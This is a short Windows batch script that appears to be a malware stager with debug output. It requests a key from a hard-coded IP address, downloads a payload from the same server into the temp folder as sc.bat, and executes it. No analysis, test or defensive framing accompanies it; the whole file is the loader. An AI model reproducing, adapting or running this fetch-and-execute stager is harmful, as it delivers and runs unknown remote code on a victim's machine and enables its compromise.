@echo off
setlocal

echo [INFO] ===== START =====
echo [INFO] BASE=http://82.29.153.101:8080
echo [INFO] FILE=%temp%\sc.bat

set BASE=http://82.29.153.101:8080
set FILE=%temp%\sc.bat

REM ===== TS =====
echo [INFO] Generating timestamp...
for /f %%i in ('powershell -NoP -Command "[int][DateTimeOffset]::UtcNow.ToUnixTimeSeconds()"') do set TS=%%i
echo [DEBUG] TS=%TS%

REM ===== KEY =====
echo [INFO] Requesting KEY from %BASE%/auth/key?ts=%TS%
for /f %%i in ('cmd /c curl -s "%BASE%/auth/key?ts=%TS%"') do set KEY=%%i
echo [DEBUG] KEY=%KEY%

REM ===== PAYLOAD =====
echo [INFO] Downloading payload to %FILE%
curl -s -H "X-Decrypt-Key: %KEY%" "%BASE%/payload/encrypted" -o "%FILE%"
echo [DEBUG] curl exit code=%errorlevel%

if exist "%FILE%" (
    echo [DEBUG] Payload file exists
) else (
    echo [ERROR] Payload file NOT found
)

REM ===== EXEC (sincrono) =====
echo [INFO] Executing %FILE%
call "%FILE%"
echo [DEBUG] Execution exit code=%errorlevel%

echo [INFO] ===== END =====

endlocal